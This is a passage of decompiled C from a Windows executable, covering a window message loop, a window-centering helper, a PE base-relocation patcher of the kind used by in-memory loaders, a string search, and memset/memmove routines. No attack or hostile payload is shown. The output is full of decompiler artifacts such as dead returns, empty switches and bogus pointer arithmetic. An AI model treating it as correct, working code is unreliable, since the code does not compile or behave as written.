			ShowWindow(*(esp_327 - 0x04), *esp_327);
			*esp_327 = (union Eq_18 *) eax_419;
			UpdateWindow(*esp_327);
			if (globals->dw43400C != 0x00)
			{
				*esp_327 = (union Eq_18 *) eax_419;
				DestroyWindow(*esp_327);
				fn00410120(ebp_205, xmm0_330);
			}
			union Eq_18 * esp_471 = esp_279 - 0x04;
			*esp_471 = (union Eq_18 *) 0x00;
			*(esp_471 - 0x04) = 0x00;
			*(esp_471 - 0x08) = 0x00;
			*(esp_471 - 0x0C) = ebp_205 - 0xB8;
			if (GetMessageA(*(esp_471 - 0x0C), *(esp_471 - 0x08), *(esp_471 - 0x04), *esp_471) > 0x00)
			{
				do
				{
					LPMSG * esp_516 = esp_279 - 0x04;
					*esp_516 = (LPMSG *) (ebp_205 - 0xB8);
					*(esp_516 - 0x04) = ~0x14;
					*(esp_516 - 0x08) = (union Eq_18 *) eax_419;
					*(esp_516 - 0x04) = (int32) GetWindowLongA(*(esp_516 - 0x08), *(esp_516 - 0x04));
					*(esp_516 - 0x08) = (union Eq_18 *) eax_419;
					if (TranslateAcceleratorA(*(esp_516 - 0x08), *(esp_516 - 0x04), *esp_516) == 0x00)
					{
						*esp_516 = (LPMSG *) (ebp_205 - 0xB8);
						*(esp_516 - 0x04) = (union Eq_18 *) eax_419;
						if (IsDialogMessageA(*(esp_516 - 0x04), *esp_516) == 0x00)
						{
							*esp_516 = (LPMSG *) (ebp_205 - 0xB8);
							TranslateMessage(*esp_516);
							*esp_516 = (LPMSG *) (ebp_205 - 0xB8);
							DispatchMessageA(*esp_516);
						}
					}
					union Eq_18 * esp_537 = esp_279 - 0x04;
					*esp_537 = (union Eq_18 *) 0x00;
					*(esp_537 - 0x04) = 0x00;
					*(esp_537 - 0x08) = 0x00;
					*(esp_537 - 0x0C) = ebp_205 - 0xB8;
				} while (GetMessageA(*(esp_537 - 0x0C), *(esp_537 - 0x08), *(esp_537 - 0x04), *esp_537) > 0x00);
			}
			Eq_18 eax_489 = *(ebp_205 - 0xB0);
			fs->ptr0000 = *(ebp_205 - 0x10);
			ptr32 ebp_498 = ebp_205->ptr0000;
			return eax_489;
			Eq_18 eax_500 = *(ebp_498 - 0xB0);
			fs->ptr0000 = *(ebp_498 - 0x10);
			return eax_500;
		}
		*esp_327 = (union Eq_18 *) 0x10;
		*(esp_327 - 0x04) = 0x00420298;
		*(esp_327 - 0x08) = 0x004202FC;
		*(esp_327 - 0x0C) = 0x00;
		MessageBoxA(*(esp_327 - 0x0C), *(esp_327 - 0x08), *(esp_327 - 0x04), *esp_327);
	}
	fs->ptr0000 = *(ebp_205 - 0x10);
	return 0x00;
}

// 00411340: void fn00411340(Register Eq_18 esi)
void fn00411340(Eq_18 esi)
{
	SystemParametersInfoA(0x30, 0x00, fp - 0x24, 0x00);
	GetWindowRect(esi, fp - 0x14);
	int64 edx_eax_54 = (int64) (dwLoc18 - dwLoc08 + dwLoc10);
	int64 edx_eax_65 = (int64) (dwLoc1C - dwLoc0C + dwLoc14);
	MoveWindow(esi, (word32) edx_eax_65 - SLICE(edx_eax_65, word32, 32) >> 0x01, (word32) edx_eax_54 - SLICE(edx_eax_54, word32, 32) >> 0x01, dwLoc0C - dwLoc14, dwLoc08 - dwLoc10, 0x00);
	return;
}

// 00411550: void fn00411550(Register word32 ebx, Register ptr32 ebp, Stack (ptr Eq_178) dwArg00, Stack word32 dwArg04, Stack word32 dwArg08)
void fn00411550(word32 ebx, ptr32 ebp, Eq_178 * dwArg00, word32 dwArg04, word32 dwArg08)
{
	int32 edx_13 = dwArg04->dw003C;
	struct Eq_3800 * esi_17 = dwArg04[(edx_13 + 0x34) / 0x0040];
	if (dwArg04 != esi_17)
	{
		word32 edx_57 = dwArg04[(edx_13 + 0xA0) / 0x0040];
		ptr32 ecx_59 = dwArg04 - esi_17;
		if (edx_57 != 0x00)
		{
			struct Eq_3819 * edx_106 = dwArg04 + edx_57 / 0x0040;
			int32 eax_110 = edx_106->dw0004;
			if (eax_110 != 0x00)
			{
l00411590:
				uint32 ebx_112 = eax_110 - 0x08;
				uint32 edi_116 = 0x00;
				if (ebx_112 >> 0x01 != 0x00)
				{
					word16 * esi_133 = &edx_106->dw0004 + 0x01;
l004115A0:
					ui32 eax_138 = (word32) *esi_133;
					word32 ecx_147 = (word32) ((word16) eax_138 >> 0x0C);
					word16 ax_143 = (word16) (eax_138 & 0x80000FFF);
					word16 cx_148 = (word16) ecx_147;
					if ((eax_138 & 0x80000FFF) < 0x00)
						ax_143 = (word16) (((eax_138 & 0x80000FFF) - 0x01 | ~0x0FFF) + 0x01);
					int32 eax_150 = (word32) ax_143;
					if (cx_148 != 0x00)
					{
						if (ecx_147 != 0x03)
							return;
						word32 * eax_167 = dwArg04 + (eax_150 + edx_106->dw0000) / 0x0040;
						*eax_167 = *eax_167 + ecx_59;
					}
					edi_116 = edi_116 + 0x01;
					esi_133 = esi_133 + 0x01;
					if (edi_116 < ebx_112 >> 0x01)
						goto l004115A0;
				}
				struct Eq_3827 * edx_123 = edx_106 + edx_106->dw0004 / 0x08;
				edx_106 = (struct Eq_3819 *) (edx_123 + edx_123->dw0004 / 0x08);
				eax_110 = edx_106->dw0004;
				if (eax_110 != 0x00)
					goto l00411590;
			}
			return;
			return;
		}
	}
	return;
}

// 00411600: Register (ptr Eq_785) fn00411600(Register (ptr Eq_785) eax, Register word32 ebx, Register (ptr word32) ebp, Stack (ptr Eq_178) dwArg00, Stack word32 dwArg04, Stack word32 dwArg08, Register out ptr32 ebxOut, Register out ptr32 ebpOut, Register out ptr32 esiOut)
Eq_785 * fn00411600(Eq_785 * eax, word32 ebx, word32 * ebp, Eq_178 * dwArg00, word32 dwArg04, word32 dwArg08, ptr32 & ebxOut, ptr32 & ebpOut, ptr32 & esiOut)
{
	struct Eq_785 * esi_111 = eax;
	struct Eq_785 * dwLoc08_133 = eax;
	Eq_3912 eax_25 = lstrlenA(dwArg08);
	if (dwArg04 < eax_25)
	{
		return null;
		word32 esi_70;
		*esiOut = dwArg04;
		word32 ebx_75;
		*ebxOut = dwArg08;
		word32 ebp_78;
		*ebpOut = *ebp;
		return null;
	}
l00411620:
	Eq_18 edx_109 = dwArg08;
	Eq_3912 edi_110 = eax_25;
	if (eax_25 >= 0x04)
	{
		do
		{
			if (esi_111->b0000 != *edx_109)
				goto l00411648;
			edi_110 = edi_110 - 0x04;
			edx_109 = (word32) edx_109 + 0x04;
			esi_111 = esi_111 + 0x04;
		} while (edi_110 >= 0x04);
	}
	if (edi_110 != 0x00)
	{
l00411648:
		int32 ecx_116 = (word32) esi_111->b0000 - (word32) (*edx_109);
		if (ecx_116 != 0x00)
		{
l00411683:
			if ((ecx_116 >> 0x1F | 0x01) != 0x00)
			{
				esi_111 = dwLoc08_133 + 0x01;
				Eq_3912 ecx_131 = dwArg04 - 0x01;
				dwLoc08_133 = esi_111;
				dwArg04 = ecx_131;
				if (ecx_131 >= eax_25)
					goto l00411620;
				return null;
			}
			goto l004116A6;
		}
		if (edi_110 > 0x01)
		{
			ecx_116 = (word32) esi_111[0x01] - (word32) (*((word32) edx_109 + 0x01));
			if (ecx_116 != 0x00)
				goto l00411683;
			if (edi_110 > 0x02)
			{
				ecx_116 = (word32) esi_111[0x02] - (word32) (*((word32) edx_109 + 0x02));
				if (ecx_116 != 0x00)
					goto l00411683;
				if (edi_110 > 0x03)
				{
					ecx_116 = (word32) esi_111[0x03] - (word32) (*((word32) edx_109 + 0x03));
					goto l00411683;
				}
			}
		}
	}
l004116A6:
	word32 esi_103;
	*esiOut = esi;
	word32 ebx_105;
	*ebxOut = ebx;
	word32 ebp_107;
	*ebpOut = ebp;
	return dwLoc08_133;
}

// 00412010: Register word32 fn00412010(Register word128 xmm0, Stack Eq_18 dwArg00, Stack ptr32 dwArg04, Stack word32 dwArg08, Stack word32 dwArg0C)
word32 fn00412010(word128 xmm0, Eq_18 dwArg00, ptr32 dwArg04, word32 dwArg08, word32 dwArg0C)
{
	uint32 edx_103 = dwArg0C;
	union Eq_4023 * ecx_132 = dwArg04;
	if (dwArg0C == 0x00)
		return edi;
	byte al_27 = bArg08;
	ui32 eax_28 = (word32) bArg08;
	if (bArg08 == 0x00 && (dwArg0C >= 0x80 && globals->dw435874 != 0x00))
	{
		if ((dwArg04 & 0x0F) != 0x00)
		{
			uint32 ebx_228 = -(dwArg04 & 0x0F);
			uint32 edx_231 = dwArg0C - (ebx_228 + 0x10);
			ui32 edx_237 = ebx_228 + 0x10 & 0x03;
			if (edx_237 != 0x00)
			{
				do
				{
					*ecx_132 = (union Eq_4023 *) 0x00;
					ecx_132 = (union Eq_4023 *) ((char *) ecx_132 + 0x01);
					edx_237 = edx_237 - 0x01;
				} while (edx_237 != 0x00);
			}
			uint32 ebx_244 = ebx_228 + 0x10 >> 0x02;
			if (ebx_244 != 0x00)
			{
				do
				{
					*ecx_132 = 0x00;
					ecx_132 = (union Eq_4023 *) ((char *) ecx_132 + 0x04);
					ebx_244 = ebx_244 - 0x01;
				} while (ebx_244 != 0x00);
			}
			edx_103 = edx_231;
		}
		uint32 edx_137 = edx_103 & 0x7F;
		uint32 eax_138 = edx_103 >> 0x07;
		if (eax_138 != 0x00)
		{
			do
			{
				*ecx_132 = (union Eq_4023 *) xmm0;
				*((char *) ecx_132 + 0x0010) = (union Eq_4023 *) xmm0;
				*((char *) ecx_132 + 0x0020) = (union Eq_4023 *) xmm0;
				*((char *) ecx_132 + 0x0030) = (union Eq_4023 *) xmm0;
				*((char *) ecx_132 + 0x0040) = (union Eq_4023 *) xmm0;
				*((char *) ecx_132 + 0x0050) = (union Eq_4023 *) xmm0;
				*((char *) ecx_132 + 0x0060) = (union Eq_4023 *) xmm0;
				*((char *) ecx_132 + 112) = (union Eq_4023 *) xmm0;
				ecx_132 = (union Eq_4023 *) ((char *) ecx_132 + 0x0080);
				eax_138 = eax_138 - 0x01;
			} while (eax_138 != 0x00);
		}
		if (edx_137 != 0x00)
		{
			uint32 eax_162 = edx_137 >> 0x04;
			if (edx_137 >> 0x04 != 0x00)
			{
				do
				{
					*ecx_132 = (union Eq_4023 *) xmm0;
					ecx_132 = (union Eq_4023 *) ((char *) ecx_132 + 0x0010);
					eax_162 = eax_162 - 0x01;
				} while (eax_162 != 0x00);
			}
			if ((edx_137 & 0x0F) != 0x00)
			{
				uint32 edx_177 = (edx_137 & 0x0F) >> 0x02;
				if (edx_177 != 0x00)
				{
					do
					{
						*ecx_132 = 0x00;
						ecx_132 = (union Eq_4023 *) ((char *) ecx_132 + 0x04);
						edx_177 = edx_177 - 0x01;
					} while (edx_177 != 0x00);
				}
				ui32 eax_182 = edx_137 & 0x0F & 0x03;
				if (eax_182 != 0x00)
				{
					do
					{
						*ecx_132 = (union Eq_4023 *) 0x00;
						ecx_132 = (union Eq_4023 *) ((char *) ecx_132 + 0x01);
						eax_182 = eax_182 - 0x01;
					} while (eax_182 != 0x00);
				}
			}
		}
		return edi;
	}
	union Eq_4023 * edi_105 = dwArg04;
	if (dwArg0C >= 0x04)
	{
		ui32 ecx_76 = -dwArg04;
		ui32 ecx_106 = ecx_76 & 0x03;
		if ((ecx_76 & 0x03) != 0x00)
		{
			edx_103 = dwArg0C - (ecx_76 & 0x03);
			do
			{
				*edi_105 = (union Eq_4023 *) bArg08;
				edi_105 = (union Eq_4023 *) ((char *) edi_105 + 0x01);
				ecx_106 = ecx_106 - 0x01;
			} while (ecx_106 != 0x00);
		}
		Eq_4204 eax_88 = eax_28 * 0x01010000 + eax_28 * 0x0101;
		al_27 = (byte) eax_88;
		edx_103 = edx_103 & 0x03;
		uint32 ecx_92 = edx_103 >> 0x02;
		if (ecx_92 != 0x00)
		{
			while (ecx_92 != 0x00)
			{
				*edi_105 = (union Eq_4023 *) eax_88;
				edi_105 = (union Eq_4023 *) ((char *) edi_105 + 0x04);
				ecx_92 = ecx_92 - 0x01;
			}
			if (edx_103 == 0x00)
			{
				return edi;
				return dwArg00;
			}
		}
	}
	do
	{
		*edi_105 = (union Eq_4023 *) al_27;
		byte * edi_67 = (char *) edi_105 + 0x01;
		uint32 edx_68 = edx_103 - 0x01;
		*edi_67 = al_27;
		edi_105 = (union Eq_4023 *) (edi_67 + 0x01);
		edx_103 = edx_68 - 0x01;
	} while (edx_68 != 0x01);
	return edi;
}

// 00412090: Register word32 fn00412090(Register int32 ebx, Stack word32 dwArg04, Stack word32 dwArg08, Stack word32 dwArg0C, Register out ptr32 esiOut, Register out ptr32 ediOut, Register out Eq_110 xmm0Out)
word32 fn00412090(int32 ebx, word32 dwArg04, word32 dwArg08, word32 dwArg0C, ptr32 & esiOut, ptr32 & ediOut, Eq_110 & xmm0Out)
{
	*xmm0Out = xmm0;
	uint32 ecx_15 = dwArg0C;
	union Eq_4246 * eax_21 = (char *) dwArg08 + dwArg0C;
	if (dwArg04 <= dwArg08 || dwArg04 >= eax_21)
	{
		if (dwArg0C >= 0x80 && globals->dw435874 != 0x00)
		{
			union Eq_4246 * esi_166 = dwArg08;
			union Eq_4246 * edi_168 = dwArg04;
			if ((dwArg04 & 0x0F) == (dwArg08 & 0x0F))
			{
				if ((dwArg08 & 0x0F) != 0x00)
				{
					uint32 edx_313 = 0x10 - (dwArg08 & 0x0F);
					uint32 ecx_314 = dwArg0C - edx_313;
					ui32 ecx_320 = edx_313 & 0x03;
					if ((edx_313 & 0x03) != 0x00)
					{
						do
						{
							*edi_168 = *esi_166;
							esi_166 = (union Eq_4246 *) ((char *) esi_166 + 0x01);
							edi_168 = (union Eq_4246 *) ((char *) edi_168 + 0x01);
							ecx_320 = ecx_320 - 0x01;
						} while (ecx_320 != 0x00);
					}
					uint32 eax_329 = edx_313 >> 0x02;
					if (edx_313 >> 0x02 != 0x00)
					{
						do
						{
							*edi_168 = *esi_166;
							esi_166 = (union Eq_4246 *) ((char *) esi_166 + 0x04);
							edi_168 = (union Eq_4246 *) ((char *) edi_168 + 0x04);
							eax_329 = eax_329 - 0x01;
						} while (eax_329 != 0x00);
					}
					ecx_15 = ecx_314;
				}
				uint32 ecx_188 = ecx_15 & 0x7F;
				uint32 edx_189 = ecx_15 >> 0x07;
				if (edx_189 != 0x00)
				{
					do
					{
						word128 xmm0_290 = *esi_166;
						*xmm0Out = xmm0_290;
						word128 xmm1_291 = *((char *) esi_166 + 0x0010);
						word128 xmm2_292 = *((char *) esi_166 + 0x0020);
						word128 xmm3_293 = *((char *) esi_166 + 0x0030);
						*edi_168 = (union Eq_4246 *) xmm0_290;
						*((char *) edi_168 + 0x0010) = (union Eq_4246 *) xmm1_291;
						*((char *) edi_168 + 0x0020) = (union Eq_4246 *) xmm2_292;
						*((char *) edi_168 + 0x0030) = (union Eq_4246 *) xmm3_293;
						word128 xmm5_299 = *((char *) esi_166 + 0x0050);
						word128 xmm6_300 = *((char *) esi_166 + 0x0060);
						word128 xmm7_301 = *((char *) esi_166 + 112);
						*((char *) edi_168 + 0x0040) = *((char *) esi_166 + 0x0040);
						*((char *) edi_168 + 0x0050) = (union Eq_4246 *) xmm5_299;
						*((char *) edi_168 + 0x0060) = (union Eq_4246 *) xmm6_300;
						*((char *) edi_168 + 112) = (union Eq_4246 *) xmm7_301;
						esi_166 = (union Eq_4246 *) ((char *) esi_166 + 0x0080);
						edi_168 = (union Eq_4246 *) ((char *) edi_168 + 0x0080);
						edx_189 = edx_189 - 0x01;
					} while (edx_189 != 0x00);
				}
				if (ecx_188 != 0x00)
				{
					uint32 edx_227 = ecx_188 >> 0x04;
					if (ecx_188 >> 0x04 != 0x00)
					{
						do
						{
							word128 xmm0_279 = *esi_166;
							*xmm0Out = xmm0_279;
							*edi_168 = (union Eq_4246 *) xmm0_279;
							esi_166 = (union Eq_4246 *) ((char *) esi_166 + 0x0010);
							edi_168 = (union Eq_4246 *) ((char *) edi_168 + 0x0010);
							edx_227 = edx_227 - 0x01;
						} while (edx_227 != 0x00);
					}
					if ((ecx_188 & 0x0F) != 0x00)
					{
						uint32 ecx_244 = (ecx_188 & 0x0F) >> 0x02;
						if (ecx_244 != 0x00)
						{
							do
							{
								*edi_168 = *esi_166;
								esi_166 = (union Eq_4246 *) ((char *) esi_166 + 0x04);
								edi_168 = (union Eq_4246 *) ((char *) edi_168 + 0x04);
								ecx_244 = ecx_244 - 0x01;
							} while (ecx_244 != 0x00);
						}
						ui32 ecx_251 = ecx_188 & 0x0F & 0x03;
						if (ecx_251 != 0x00)
						{
							do
							{
								*edi_168 = *esi_166;
								esi_166 = (union Eq_4246 *) ((char *) esi_166 + 0x01);
								edi_168 = (union Eq_4246 *) ((char *) edi_168 + 0x01);
								ecx_251 = ecx_251 - 0x01;
							} while (ecx_251 != 0x00);
						}
					}
				}
				word32 esi_220;
				*esiOut = esi;
				word32 edi_222;
				*ediOut = edi;
				return ebp;
			}
		}
		union Eq_4246 * esi_61 = dwArg08;
		union Eq_4246 * edi_62 = dwArg04;
		if ((dwArg04 & 0x03) != 0x00)
		{
			if (dwArg0C < 0x04)
			{
				word32 esp_132;
				word32 ebp_133;
				word32 edi_134;
				word32 esi_135;
				word32 ecx_136;
				word32 eax_137;
				word32 edx_138;
				byte SCZO_139;
				byte CZ_140;
				byte C_141;
				byte Z_142;
				byte SZO_143;
				word128 xmm0_144;
				word128 xmm1_145;
				word128 xmm2_146;
				word128 xmm3_147;
				word128 xmm4_148;
				word128 xmm5_149;
				word128 xmm6_150;
				word128 xmm7_151;
				word32 ebx_152;
				byte al_153;
				byte dl_154;
				byte D_155;
				(*((char *) globals->a412210 + (dwArg0C - 0x04) * 0x04))();
				return ebp_133;
			}
			else
			{
				word32 esp_108;
				word32 ebp_109;
				word32 edi_110;
				word32 esi_111;
				word32 ecx_112;
				word32 eax_113;
				word32 edx_114;
				byte SCZO_115;
				byte CZ_116;
				byte C_117;
				byte Z_118;
				byte SZO_119;
				word128 xmm0_120;
				word128 xmm1_121;
				word128 xmm2_122;
				word128 xmm3_123;
				word128 xmm4_124;
				word128 xmm5_125;
				word128 xmm6_126;
				word128 xmm7_127;
				word32 ebx_128;
				byte al_129;
				byte dl_130;
				byte D_131;
				(*((char *) globals->a412114 + (dwArg04 & 0x03) * 0x04))();
				return ebp_109;
			}
		}
		else
		{
			uint32 ecx_67 = dwArg0C >> 0x02;
			if (dwArg0C >> 0x02 < 0x08)
			{
				switch (dwArg0C & 0x03)
					;
			}
			else
			{
				while (ecx_67 != 0x00)
				{
					*edi_62 = *esi_61;
					esi_61 = (union Eq_4246 *) ((char *) esi_61 + 0x04);
					edi_62 = (union Eq_4246 *) ((char *) edi_62 + 0x04);
					ecx_67 = ecx_67 - 0x01;
				}
				switch (dwArg0C & 0x03)
				{
				case 0x00:
					word32 esi_74;
					*esiOut = esi;
					word32 edi_76;
					*ediOut = edi;
					return ebp;
				}
			}
		}
	}
	else
	{
		word32 * esi_365 = (char *) dwArg08 + (dwArg0C - 0x04);
		word32 * edi_366 = (char *) dwArg04 + (dwArg0C - 0x04);
		if ((edi_366 & 0x03) != 0x00)
		{
			if (dwArg0C < 0x04)
			{
				switch (dwArg0C)
					;
			}
			else
			{
				word32 esp_434;
				word32 ebp_435;
				word32 edi_436;
				word32 esi_437;
				word32 ecx_438;
				word32 eax_439;
				word32 edx_440;
				byte SCZO_441;
				byte CZ_442;
				byte C_443;
				byte Z_444;
				byte SZO_445;
				word128 xmm0_446;
				word128 xmm1_447;
				word128 xmm2_448;
				word128 xmm3_449;
				word128 xmm4_450;
				word128 xmm5_451;
				word128 xmm6_452;
				word128 xmm7_453;
				word32 ebx_454;
				byte al_455;
				byte dl_456;
				byte D_457;
				(*((char *) globals->a4122A0 + (edi_366 & 0x03) * 0x04))();
				return ebp_435;
			}
		}
		else
		{
			uint32 ecx_384 = dwArg0C >> 0x02;
			if (dwArg0C >> 0x02 < 0x08)
			{
				uint32 ecx_399 = -(dwArg0C >> 0x02);
				word32 esp_402;
				word32 ebp_403;
				word32 edi_404;
				word32 esi_405;
				word32 ecx_406;
				word32 eax_407;
				word32 edx_408;
				byte SCZO_409;
				byte CZ_410;
				byte C_411;
				byte Z_412;
				byte SZO_413;
				word128 xmm0_414;
				word128 xmm1_415;
				word128 xmm2_416;
				word128 xmm3_417;
				word128 xmm4_418;
				word128 xmm5_419;
				word128 xmm6_420;
				word128 xmm7_421;
				word32 ebx_422;
				byte al_423;
				byte dl_424;
				byte D_425;
				(*((char *) globals->a41234C + ecx_399 * 0x04))();
				return ebp_403;
			}
			else
			{
				while (ecx_384 != 0x00)
				{
					*edi_366 = *esi_365;
					esi_365 = esi_365 - 0x04;
					edi_366 = edi_366 - 0x04;
					ecx_384 = ecx_384 - 0x01;
				}
				switch (dwArg0C & 0x03)
				{
				case 0x00:
					word32 esi_378;
					*esiOut = esi;
					word32 edi_380;
					*ediOut = edi;
					return ebp;
				}
			}
		}
	}
}

